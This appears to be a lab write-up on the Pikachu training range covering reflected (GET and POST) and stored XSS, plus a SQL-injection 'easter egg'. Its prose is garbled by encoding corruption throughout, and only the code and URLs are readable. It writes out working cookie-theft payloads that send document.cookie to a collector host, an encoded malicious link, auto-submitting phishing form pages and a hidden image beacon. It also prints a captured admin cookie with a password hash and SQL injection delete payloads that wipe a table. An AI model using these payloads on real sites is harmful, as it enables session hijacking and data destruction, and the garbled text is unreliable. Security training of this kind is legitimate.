> ç”±äºå½“å‰é¡µé¢å¤„äºå·²ç™»å½•çŠ¶æ€ï¼Œæµè§ˆå™¨ä¸­ä¿å­˜äº†ç”¨æˆ·çš„èº«ä»½ Cookieï¼Œä¸€æ—¦è¢«çªƒå–ï¼Œæ”»å‡»è€…å³å¯å†’å……è¯¥ç”¨æˆ·å®Œæˆä¼šè¯åŠ«æŒã€‚
>

ä¸Šæ–‡è¯´åˆ°ï¼Œç¡®è®¤äº†å·²ç™»å½•ç”¨æˆ·ã€Cookie å­˜åœ¨ã€XSS å¯æ‰§è¡Œï¼Œé‚£ä¹ˆä½œä¸ºé‡è¦çš„ç”¨æˆ·è®¤è¯å‚æ•° Cookie å¿…å®šæ˜¯æ”»å‡»è€…çªƒå–çš„ç›®æ ‡ã€‚



å¤§ä½“çš„æ”»å‡»æµç¨‹å¦‚ä¸‹å›¾æ‰€ç¤ºï¼šï¼ˆä¿©ä¸ªç«™ç‚¹éƒ½æ˜¯æœ¬åœ° PHPStudy æ­å»ºçš„ç½‘ç«™ï¼‰

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051615811.png)



æˆ‘ä»¬å…ˆä½¿ç”¨ åå°„å‹xss(get) è¿›è¡Œçªƒå– Cookieï¼š



åœ¨å‘é€æ¶æ„ä»£ç å‰ï¼Œå…ˆä¿®æ”¹ä¸€äº›é…ç½®ï¼šphpstudy_pro\WWW\pikachu-master\pkxss\xcookie\cookie.php

<font style="color:#080808;background-color:#ffffff;">å°† </font>`<font style="color:#080808;background-color:#ffffff;">header("Location:http://pikachu:8765/index.php");//é‡å®šå‘åˆ°ä¸€ä¸ªå¯ä¿¡çš„ç½‘ç«™ </font>`<font style="color:#080808;background-color:#ffffff;"> è¿›è¡Œä¿®æ”¹ä¸ºè‡ªå·±æ­å»ºçš„ pikachu çš„é¦–é¡µå³å¯</font>

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051634465.png)

> å®é™…ä¸Šï¼Œcookie.php å°±æ˜¯ç”¨æ¥ <font style="color:#080808;background-color:#ffffff;">è·å–cookieçš„apié¡µé¢ã€‚</font>
>







æ¶æ„ JS ä»£ç ï¼š

```html
<script>
document.location = 'http://pikachu:8765/pkxss/xcookie/cookie.php?cookie=' + document.cookie;
</script>
```

` document.location = ...  ` æ˜¯è®©æµè§ˆå™¨**è·³è½¬åˆ°ä¸€ä¸ªæ–°çš„ URL**ï¼Œå³ `[http://pikachu:8765/pkxss/xcookie/cookie.php?cookie=](http://pikachu:8765/pkxss/xcookie/cookie.php?cookie=)` 

åŒæ—¶ï¼š`document.cookie`  ä¼šè¿”å›å½“å‰ç½‘é¡µçš„æ‰€æœ‰ **å¯è®¿é—® Cookie**

`+` å°† URL å’Œ Cookie æ‹¼æ¥èµ·æ¥ï¼Œå½¢æˆä¸€ä¸ªå®Œæ•´çš„ GET è¯·æ±‚  

 è¿™æ ·ï¼Œå½“ç”¨æˆ·è®¿é—®è¿™ä¸ªè„šæœ¬æ‰€åœ¨é¡µé¢æ—¶ï¼Œä»–çš„ Cookie ä¼šè¢«å‘é€ç»™æ”»å‡»è€…æœåŠ¡å™¨ã€‚  





ç”¨æˆ·å°†æ¶æ„ä»£ç è¾“å…¥å­˜åœ¨ XSS æ¼æ´çš„é¡µé¢ä¸­ä¹‹åï¼šé¡µé¢é‡å®šå‘åˆ° <font style="color:#080808;background-color:#ffffff;">"Location:http://pikachu:8765/index.php"ï¼ŒåŒæ—¶ä¹Ÿæ‰§è¡Œäº†ï¼š</font>

```html
<script>
document.location = 'http://pikachu:8765/pkxss/xcookie/cookie.php?cookie=' + document.cookie;
</script>
```

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051628767.png)



<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051630794.png)





åœ¨æ”»å‡»è€…çš„åå°ä¸­ï¼Œè®°å½•äº†è¯¥ç”¨æˆ·ï¼Œè·å–åˆ°è¯¥ç”¨æˆ·çš„ cookie ä¿¡æ¯ï¼š

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051623842.png)





é‚£ä¹ˆä¸Šè¿°æ˜¯ç”¨æˆ·è‡ªå·±æ— æ„è¯†å¾—å»æ‰§è¡Œäº†æ¶æ„ä»£ç ï¼Œå¦‚æœæœ‰äº›å¸¸è¯†å¾—è¯ï¼Œåº”è¯¥ä¸ä¼šç›´æ¥å»æ‰§è¡Œ `<script>document.location = '[http://pikachu:8765/pkxss/xcookie/cookie.php?cookie='](http://pikachu:8765/pkxss/xcookie/cookie.php?cookie=') + document.cookie;</script>` è¿™ç§å±é™©çš„ JS ä»£ç å§ã€‚

é‚£ä¹ˆæ›´ä¸ºå¸¸è§çš„æ”»å‡»æ–¹å¼æ˜¯ï¼šç›´æ¥æ‹¼æ¥ä¸€ä¸ªè¿æ¥ï¼Œè¯±å¯¼ç”¨æˆ·å»ç‚¹å‡»ï¼Œä»è€Œå°†ç”¨æˆ·çš„ä¿¡æ¯å‘é€åˆ°æ”»å‡»è€…çš„åå°ã€‚



çœ‹çœ‹æ€ä¹ˆæ„é€ è¿™ä¸ªæ¶æ„çš„é“¾æ¥ï¼š

```html
//é¦–å…ˆè¦è®©å—å®³è€…è®¿é—®çš„æ˜¯è¿™ä¸ªé¡µé¢
1> http://pikachu:8765/vul/xss/xss_reflected_get.php

//é‚£ä¹ˆè¦ä¼ å…¥çš„å‚æ•°æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿ
ä»æŠ“åŒ…åˆ†æï¼š
GET /vul/xss/xss_reflected_get.php?message=111&submit=submit HTTP/1.1
Host: 127.0.0.1:8765
Accept-Encoding: gzip, deflate, br, zstd
sec-ch-ua: "Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Cookie: PHPSESSID=v4cp9r4ovlglba0966s4133og1
Referer: http://127.0.0.1:8765/vul/xss/xss_reflected_get.php

2> http://pikachu:8765/vul/xss/xss_reflected_get.php?message=&submit=submit

//message ä¸­è¦ä¼ å…¥çš„å°±æ˜¯ä¸Šæ–‡çš„æ¶æ„ JS ä»£ç ï¼š
<script>document.location = 'http://pikachu:8765/pkxss/xcookie/cookie.php?cookie=' + document.cookie;</script>

3> http://pikachu:8765/vul/xss/xss_reflected_get.php?message=<script>document.location = 'http://pikachu:8765/pkxss/xcookie/cookie.php?cookie=' + document.cookie;</script>&submit=submit

//å¦‚æœåªåœç•™åœ¨ç¬¬ä¸‰æ­¥ï¼Œè¿™ä¸ª url æ˜¯ä¸åˆæ ¼çš„ï¼Œåº”è¯¥å¯¹å…¶è¿›è¡Œç¼–ç 

4> http://pikachu:8765/vul/xss/xss_reflected_get.php?message=%3Cscript%3Edocument.location+%3D+%27http%3A%2F%2Fpikachu%3A8765%2Fpkxss%2Fxcookie%2Fcookie.php%3Fcookie%3D%27+%2B+document.cookie%3B%3C%2Fscript%3E&submit=submit
```



æœ€ç»ˆå¾—åˆ°çš„æ¶æ„é“¾æ¥ï¼š

```html
http://pikachu:8765/vul/xss/xss_reflected_get.php?message=%3Cscript%3Edocument.location+%3D+%27http%3A%2F%2Fpikachu%3A8765%2Fpkxss%2Fxcookie%2Fcookie.php%3Fcookie%3D%27+%2B+document.cookie%3B%3C%2Fscript%3E&submit=submit
```





å‡è®¾æ”»å‡»è€…æ„é€ äº†è¿™æ ·ä¸€ä¸ªæ¶æ„é“¾æ¥ï¼š

`http://pikachu:8765/vul/xss/xss_reflected_get.php?message=%3Cscript%3Edocument.location+%3D+%27http%3A%2F%2Fpikachu%3A8765%2Fpkxss%2Fxcookie%2Fcookie.php%3Fcookie%3D%27+%2B+document.cookie%3B%3C%2Fscript%3E&submit=submit`



è€ŒæŸä¸ªç”¨æˆ·â€œä¸å°å¿ƒâ€œç‚¹å‡»äº†è¯¥é“¾æ¥ï¼š

`http://pikachu:8765/vul/xss/xss_reflected_get.php?message=%3Cscript%3Edocument.location+%3D+%27http%3A%2F%2Fpikachu%3A8765%2Fpkxss%2Fxcookie%2Fcookie.php%3Fcookie%3D%27+%2B+document.cookie%3B%3C%2Fscript%3E&submit=submit`



çœ‹èµ·æ¥åªæ˜¯è®¿é—®äº† pikachu çš„é¦–é¡µï¼Œå®é™…ä¸Šå·²ç»è·å–äº†è¯¥ç”¨æˆ·çš„ Cookie å¹¶ä¸”å‘é€ç»™äº†æ”»å‡»è€…çš„åå°

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051657391.png)



æ”»å‡»è€…åå°ï¼š

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051623930.png)



é‚£ä¹ˆè¿™å°±æ˜¯ GET å‹ XSS æ”»å‡»ï¼Œæ„Ÿå…´è¶£çš„åŒå­¦è¿˜å¯ä»¥å»æºç ä¸­çœ‹çœ‹ï¼Œå…·ä½“çš„æ‰§è¡Œæ–¹æ³•ï¼š

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051625804.png)





## POST å‹ XSS æ”»å‡»åˆ©ç”¨ï¼ˆCookie çªƒå–ï¼‰ 
ç”±äºè¿™ç§æ–¹å¼åªåœ¨ pikachu çš„æºç ä¸­æœ‰æ‰€æåŠï¼Œå¤§éƒ¨åˆ†å¸ˆå‚…çš„æ–‡ç« ä¸­åªæ¶‰åŠäº† GET å‹ï¼Œæ‰€ä»¥ POST å‹æˆ‘å°±ç»“åˆæºç å’Œä¸ªäººç†è§£å†™åˆ©ç”¨æ–¹å¼å§ã€‚



### æºç åˆ†æ
é¦–å…ˆçœ‹çœ‹æºç æ˜¯æ€ä¹ˆå†™çš„ï¼š

#### æ–‡ä»¶è·¯å¾„ï¼š pkxss/xcookie/pkxss_cookie_result.php
```php
<?php
  //æ³¨é‡Šæ‰äº†é”™è¯¯æ˜¾ç¤ºï¼Œé¿å…æŠ¥é”™æ³„éœ²è·¯å¾„ / SQL / é…ç½®ï¼Œ
// error_reporting(0);

//å¼•å…¥é…ç½®æ–‡ä»¶
include_once '../inc/config.inc.php';
include_once '../inc/mysql.inc.php';
//è°ƒç”¨ connect()ï¼Œå»ºç«‹ MySQL æ•°æ®åº“è¿æ¥ï¼Œ$link æ˜¯åé¢æ‰€æœ‰ SQL æ“ä½œçš„â€œå¥æŸ„â€
$link=connect();

// åˆ¤æ–­æ˜¯å¦ç™»å½•ï¼Œæ²¡æœ‰ç™»å½•ä¸èƒ½è®¿é—®
if(!check_login($link)){
    header("location:../pkxss_login.php");
}

//åŠŸèƒ½ï¼šåˆ é™¤ Cookie è®°å½•
if(isset($_GET['id']) && is_numeric($_GET['id'])){
    $id=escape($link, $_GET['id']);
    $query="delete from cookies where id=$id";
    execute($link, $query);
}
?>

<!--HTML é¡µé¢ç»“æ„ï¼ˆæ˜¾ç¤ºçªƒå–ç»“æœï¼‰-->
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>cookieæœé›†ç»“æœ</title>
<link rel="stylesheet" type="text/css" href="../antxss.css" />
</head>
<body>
<div id="title">
<h1>pikachu Xss è·å–cookiesç»“æœ</h1>
<a href="../xssmanager.php">è¿”å›é¦–é¡µ</a>
</div>
<div id="xss_main">
<table border="1px" cellpadding="10" cellspacing="1" bgcolor="#5f9ea0">
    <tr>
        <td>id</td>
        <td>time</td>
        <td>ipaddress</td>
        <td>cookie</td>
        <td>referer</td>
        <td>useragent</td>
        <td>åˆ é™¤</td>
    </tr>
    <?php 
    //PHP æŸ¥è¯¢æ•°æ®åº“å¹¶è¾“å‡ºæ¯ä¸€è¡Œ
    $query="select * from cookies";
    $result=mysqli_query($link, $query);
    while($data=mysqli_fetch_assoc($result)){
$html=<<<A
    <tr>
        <td>{$data['id']}</td>
        <td>{$data['time']}</td>
        <td>{$data['ipaddress']}</td>
        <td>{$data['cookie']}</td>
        <td>{$data['referer']}</td>
        <td>{$data['useragent']}</td>
        <td><a href="pkxss_cookie_result.php?id={$data['id']}">åˆ é™¤</a></td>
    </tr>
A;
         
        echo $html;
        
        
    }
    
    ?>
    
</table>
</div>
</body>
</html>
```

#### æ–‡ä»¶è·¯å¾„ï¼špkxss/xcookie/post.html
```html
<!-- è¿™æ˜¯ä¸€ä¸ªâ€œé’“é±¼é¡µé¢â€
å—å®³è€…ä¸€è®¿é—®è¿™ä¸ª HTML â†’ è¡¨å•è‡ªåŠ¨ POST åˆ°å­˜åœ¨ XSS çš„é¡µé¢ â†’
æ¶æ„ <script> è¢«æœåŠ¡å™¨åŸæ ·è¿”å› â†’
åœ¨å—å®³è€…æµè§ˆå™¨ä¸­æ‰§è¡Œ â†’
Cookie è¢«å·èµ°ã€‚ -->

<html>
<head>
  <!--HTML å¤´éƒ¨ï¼šè‡ªåŠ¨è§¦å‘è¡¨å•æäº¤  -->
<script>
window.onload = function() {
  // æ‰¾åˆ° id="postsubmit" çš„å…ƒç´ ï¼Œæ¨¡æ‹Ÿç”¨æˆ·ç‚¹å‡»ã€‚è¿™ä¸ªå…ƒç´ æ˜¯ä¸‹é¢çš„ <input type="submit">
  document.getElementById("postsubmit").click();
}
</script>
</head>
<body>
  
<!--
  method="post"  ä½¿ç”¨ POST æäº¤ï¼ˆURL çœ‹ä¸åˆ°å‚æ•°ï¼‰
  action="xss_reflected_post.php" Pikachu é¶åœºä¸­ å­˜åœ¨ POST å‹åå°„ XSS çš„é¡µé¢  -->
<form method="post" action="http://192.168.1.4/pikachu/vul/xss/xsspost/xss_reflected_post.php">
    <!-- çœŸæ­£çš„ XSS Payloadï¼ˆæ ¸å¿ƒï¼‰ -->
  <input id="xssr_in" type="text" name="message" value=
    "<script>
document.location = 'http://192.168.1.15/pkxss/xcookie/cookie.php?cookie=' + document.cookie;
	</script>"
	 />
  <!-- æäº¤æŒ‰é’®ï¼ˆè¢«è‡ªåŠ¨ç‚¹å‡»ï¼‰ -->
    <input id="postsubmit" type="submit" name="submit" value="submit" />
</form>
</body>
</html>

<!--
 * 
<script>
document.write('<img src="http://127.0.0.1/antxss/xcookie/cookie.php?cookie='+document.cookie+'" width="0" height="0" border="0" />');
</script>
*/
/*
<script>
document.location = 'http://127.0.0.1/antxss/xcookie/cookie.php?cookie=' + document.cookie;
</script>
*/
-->


```



#### æºç å°ç»“ï¼š
ç°åœ¨æˆ‘ä»¬å¤§è‡´ç†è§£äº†è¿™ä¸ªé’“é±¼é¡µé¢çš„å·¥ä½œåŸç†äº†ï¼Œæ€»ç»“ä¸€ä¸‹å§ï¼š

â‘  å—å®³è€…è®¿é—®è¿™ä¸ª HTML

```plain
http://evil.com/post_xss.html
```

---

â‘¡ é¡µé¢åŠ è½½å®Œæˆ

```plain
window.onload â†’ è‡ªåŠ¨ç‚¹å‡» submit
```

---

â‘¢ è¡¨å• POST è¯·æ±‚å‘é€

```plain
POST /pikachu/vul/xss/xsspost/xss_reflected_post.php
message=<script>...</script>
```

---

â‘£ æœåŠ¡å™¨å­˜åœ¨æ¼æ´

```plain
echo $_POST['message']; // æœªè¿‡æ»¤
```

---

â‘¤ æ¶æ„ JS åœ¨å—å®³è€…æµè§ˆå™¨æ‰§è¡Œ

```plain
document.cookie
```

---

â‘¥ Cookie è¢«å‘é€åˆ°æ”»å‡»è€…æœåŠ¡å™¨

```plain
/pkxss/xcookie/cookie.php?cookie=...
```

---

â‘¦ æ”»å‡»è€…åœ¨åå°æŸ¥çœ‹ cookie_result.php

âœ” ä¼šè¯åŠ«æŒ  
âœ” å†’å……ç™»å½•  
âœ” æ¥ç®¡è´¦å·



#### å…¶ä»–æ–¹æ³•ï¼š
æˆ‘ä»¬å‘ç°ï¼Œé’“é±¼é¡µé¢ä¸­æ³¨é‡Šäº†ä¿©ç§æ–¹æ³•ï¼Œä¹ŸæŠŠä»–ä»¬åˆ†æä¸€ä¸‹ï¼š

**æ–¹æ³•ä¸€ï¼š**`**document.write + img**`

```html
<script>
document.write('<img src="http://127.0.0.1/antxss/xcookie/cookie.php?cookie='+document.cookie+'" width="0" height="0" border="0" />');
</script>
```

âœ” ä¸è·³è½¬é¡µé¢  
âœ” ç”¨æˆ·æ— æ„ŸçŸ¥  
âœ” **æœ€éšè”½ï¼Œæœ€å¸¸ç”¨**

---

**æ–¹æ³•äºŒï¼š**`**document.location**`

```html
<script>
  document.location = 'http://127.0.0.1/antxss/xcookie/cookie.php?cookie=' + document.cookie;
</script>
```

âœ” ç®€å•ç²—æš´  
âŒ é¡µé¢ä¼šè·³èµ°  
âŒ å®¹æ˜“è¢«ç”¨æˆ·å‘ç°



### å¤ç°æ¼æ´
ä¿®æ”¹ä¸€äº›å‚æ•°ï¼šä¿®æ”¹ä¹‹åé‡å¯ç½‘ç«™

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051619670.png)





å‰æè¯´æ˜ï¼Œ

**æœ€å¥½æ–°å¼€ä¸€ä¸ªæµè§ˆå™¨ï¼Œé˜²æ­¢ç¼“å­˜çš„ cookie å¹²æ‰°**



ï¼ˆä»¥ä¸‹æ¨¡æ‹Ÿè¿‡ç¨‹ä¸­ä½¿ç”¨çš„æµè§ˆå™¨ï¼Œä¹‹å‰æ²¡æœ‰è®¿é—®è¿‡ [http://pikachu:8765/vul/xss/xsspost/post_login.php](http://pikachu:8765/vul/xss/xsspost/post_login.php) ï¼Œæ²¡æœ‰ç”¨æˆ·å’Œå¯†ç ï¼‰

æ¥ä¸‹æ¥çš„è¿‡ç¨‹æ¨¡æ‹Ÿä¸€ä¸ªå·²ç™»å½•çš„å—å®³è€…ï¼Œå› æŸäº›åŸå› ç‚¹å‡»äº†æ”»å‡»è€…çš„æ¶æ„é“¾æ¥ï¼Œå¯¼è‡´å…¶è´¦å·ä¿¡æ¯è¢«ç›—å–ã€‚



å—å®³è€…ç™»å½•è¯¥ç½‘ç«™ï¼š[http://pikachu:8765/vul/xss/xsspost/post_login.php](http://pikachu:8765/vul/xss/xsspost/post_login.php)

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051619522.png)

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051624554.png)



#### ç¬¬ä¸€ç§é’“é±¼é¡µé¢ï¼š
å—å®³è€…ç‚¹å‡»æ¶æ„é“¾æ¥ï¼š

`[http://pikachu:8765/pkxss/xcookie/post.html](http://pikachu:8765/pkxss/xcookie/post.html)`

`p[ost.html](http://pikachu:8765/pkxss/xcookie/post.html)` çš„æºç ï¼š

```html
<html>
<head>
<script>
window.onload = function() {
  document.getElementById("postsubmit").click();
}
</script>
</head>
<body>
<form method="post" action="http://pikachu:8765/vul/xss/xsspost/xss_reflected_post.php">
    <input id="xssr_in" type="text" name="message" value=
    "<script>
document.location = 'http://pikachu:8765/pkxss/xcookie/cookie.php?cookie=' + document.cookie;
	</script>"
	 />
    <input id="postsubmit" type="submit" name="submit" value="submit" />
</form>
</body>
</html>

<!--
 * 
<script>
document.write('<img src="http://127.0.0.1/antxss/xcookie/cookie.php?cookie='+document.cookie+'" width="0" height="0" border="0" />');
</script>
*/
/*
<script>
document.location = 'http://127.0.0.1/antxss/xcookie/cookie.php?cookie=' + document.cookie;
</script>
*/
-->


```



é¦–å…ˆæ˜¯è®¿é—®äº† `[http://pikachu:8765/vul/xss/xsspost/xss_reflected_post.php](http://pikachu:8765/vul/xss/xsspost/xss_reflected_post.php)`

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051625520.png)

ç„¶åè·³è½¬åˆ°ï¼š

`[http://pikachu:8765/pkxss/xcookie/cookie.php?cookie=ant[uname]=admin;%20ant[pw]=10470c3b4b1fed12c3baac014be15fac67c6e815;%20PHPSESSID=fmrc3pd969hdhp65ijdp5vgb91](http://pikachu:8765/pkxss/xcookie/cookie.php?cookie=ant[uname]=admin;%20ant[pw]=10470c3b4b1fed12c3baac014be15fac67c6e815;%20PHPSESSID=fmrc3pd969hdhp65ijdp5vgb91)` è·å–äº†ç”¨æˆ·ä¿¡æ¯

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051628903.png)

å½“ç„¶ï¼Œä¹‹ååº”è¯¥é‡å®šå‘åˆ° æºç ä¸­å†™ä½ç½®ï¼š`<font style="color:#080808;background-color:#ffffff;">header("Location:http://pikachu:8765/index.php");//é‡å®šå‘åˆ°ä¸€ä¸ªå¯ä¿¡çš„ç½‘ç«™</font>`<font style="color:#080808;background-color:#ffffff;"> ã€‚æˆ‘è¿™é‡Œä¸ºäº†è°ƒè¯•æ¯ä¸€æ­¥çš„æµç¨‹ï¼Œæ‰€ä»¥å°†å…¶æ³¨é‡Šæ‰äº†ã€‚</font>

ï¼ˆè‡ªåŠ¨é‡å®šå‘é¦–é¡µ, (æ˜¯ä¸ºäº†ä¸è®©ç”¨æˆ·å¯Ÿè§‰è¢«æ”»å‡»çš„äº‹å®), å¦‚æœé‡å®šå‘å…¶ä»–åœ°å€, ç”¨æˆ·å°±ä¼šçŸ¥é“è¢«æ”»å‡»äº†ï¼‰







é‚£ä¹ˆåœ¨æ”»å‡»è€…åå°å¯ä»¥çœ‹åˆ°å—å®³è€…çš„ä¿¡æ¯ï¼š

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051620208.png)



#### ç¬¬äºŒç§é’“é±¼é¡µé¢ï¼š
```html
<html>
<head>
<script>
window.onload = function() {
  document.getElementById("postsubmit").click();
}
</script>
</head>
<body>
<form method="post" action="http://pikachu:8765/vul/xss/xsspost/xss_reflected_post.php">
    <input id="xssr_in" type="text" name="message" value="<script>
document.write('<img src=http://pikachu:8765/pkxss/xcookie/cookie.php?cookie=' + document.cookie + ' width=0 height=0 border=0>');
</script>" />
    <input id="postsubmit" type="submit" name="submit" value="submit" />
</form>

</body>
</html>

<!--
 * 
<script>
document.write('<img src="http://127.0.0.1/antxss/xcookie/cookie.php?cookie='+document.cookie+'" width="0" height="0" border="0" />');
</script>
*/
/*
<script>
document.location = 'http://127.0.0.1/antxss/xcookie/cookie.php?cookie=' + document.cookie;
</script>
*/
-->

<!--    "<script>
document.location = 'http://pikachu:8765/pkxss/xcookie/cookie.php?cookie=' + document.cookie;
	</script>"-->
```



`[http://pikachu:8765/pkxss/xcookie/post.html](http://pikachu:8765/pkxss/xcookie/post.html)`



è¿™ç§æ–¹å¼åŒæ ·ä¹Ÿå¯ä»¥è·å–åˆ°ç”¨æˆ·ä¿¡æ¯

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051615818.png)

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051636216.png)





## 2.3 å­˜å‚¨å‹xss
### æ¼æ´åŸç†ï¼š
** æ”»å‡»è€…æŠŠæ¶æ„è„šæœ¬æäº¤åˆ°æœåŠ¡å™¨å¹¶è¢«æ°¸ä¹…ä¿å­˜ï¼ˆæ•°æ®åº“ / æ–‡ä»¶ï¼‰ï¼Œ  
****ä¹‹åæ‰€æœ‰è®¿é—®è¯¥é¡µé¢çš„ç”¨æˆ·éƒ½ä¼šè‡ªåŠ¨æ‰§è¡Œè¿™æ®µè„šæœ¬ã€‚  **

****

å…¸å‹çš„ç•™è¨€æ¿ï¼š

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051630835.png)



å°è¯•å†™å…¥æ¶æ„ XSS è¯­å¥ï¼š

```html
<script>alert('xsss')</script>
```



æäº¤åå°±ä¼šå¼¹çª—

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051618743.png)



å¹¶ä¸”æ¯ä¸€æ¬¡åˆ·æ–°é¡µé¢ï¼Œéƒ½ä¼šå¼¹çª—ï¼š

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051624668.gif)

è¿™è¯´æ˜æˆ‘ä»¬çš„æ•°æ®è¢«å­˜å‚¨èµ·æ¥äº†ï¼Œä¹Ÿå°±æ˜¯å­˜å‚¨å‹çš„xss

<font style="color:rgb(77, 77, 77);"></font>

<font style="color:rgb(77, 77, 77);">å­˜å‚¨çš„å†…å®¹ä¹Ÿä¸æ­¢æ˜¯ </font>`<font style="color:rgb(77, 77, 77);"><script></font>`

æˆ‘ä»¬è¿˜å¯ä»¥æ’å…¥ä¸€ä¸ªå›¾ç‰‡æ ‡ç­¾ï¼šåŒæ ·å¯ä»¥è¾¾åˆ°ç›®çš„

```html
<img src=1 onerror=alert(1)>
```

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051626287.gif)



<font style="color:rgb(0, 0, 0);">è¿˜å¯ä»¥ï¼š æ³¨å…¥è·³è½¬ç½‘é¡µ </font>

```javascript
<script>document.location='https://www.baidu.com/'</script>
```



æ³¨å…¥ä¹‹åå‘¢ï¼Ÿ

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.nlark.com/yuque/0/2025/gif/52403351/1767177843601-08b03fbc-b344-45c0-80ec-39c7aef8dfe2.gif)



ç³Ÿç³•ã€‚ã€‚ã€‚æ²¡æ³•åˆ äº†ï¼Œå»çœ‹çœ‹æºç å§ã€‚



### â€”â€”â€”â€”å½©è›‹â€”â€”â€”â€”
è¯¯æ‰“è¯¯æ’ï¼Œç¢°åˆ°äº†å½©è›‹

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051627986.png)



```php
if(array_key_exists('id', $_GET) && is_numeric($_GET['id'])){

  //å½©è›‹:è™½ç„¶è¿™æ˜¯ä¸ªå­˜å‚¨å‹xssçš„é¡µé¢,ä½†è¿™é‡Œæœ‰ä¸ªdeleteçš„sqlæ³¨å…¥
  $query="delete from message where id={$_GET['id']}";
  $result=execute($link, $query);
  if(mysqli_affected_rows($link)==1){
    echo "<script type='text/javascript'>document.location.href='xss_stored.php'</script>";
  }else{
    $html.="<p id='op_notice'>åˆ é™¤å¤±è´¥,è¯·é‡è¯•å¹¶æ£€æŸ¥æ•°æ®åº“æ˜¯å¦è¿˜å¥½!</p>";

  }

}
```

é—®é¢˜åœ¨äºï¼š

`is_numeric()` å¹¶ä¸èƒ½é˜² SQL æ³¨å…¥ï¼Œæ²¡æœ‰ä½¿ç”¨é¢„ç¼–è¯‘ï¼Œå‚æ•°ç›´æ¥æ‹¼æ¥è¿› SQL



#### å®Œæ•´åˆ©ç”¨æ–¹å¼æ€»ç»“ï¼š
âœ” åˆ å•æ¡

xss_stored.php?id=3

âœ” åˆ å¤šæ¡

xss_stored.php?id=0 or id>0

âœ” åˆ æ•´è¡¨

xss_stored.php?id=1 or 1=1

âœ” å®šå‘åˆ è·³è½¬ XSS

xss_stored.php?id=0 or content like '%baidu%'



ä¹Ÿå°±æ˜¯è¯´è¿™é‡Œï¼š

```plain
$query="delete from message where id={$_GET['id']}";
```

ğŸ‘‰ **æ²¡æœ‰ä»»ä½•è¿‡æ»¤**

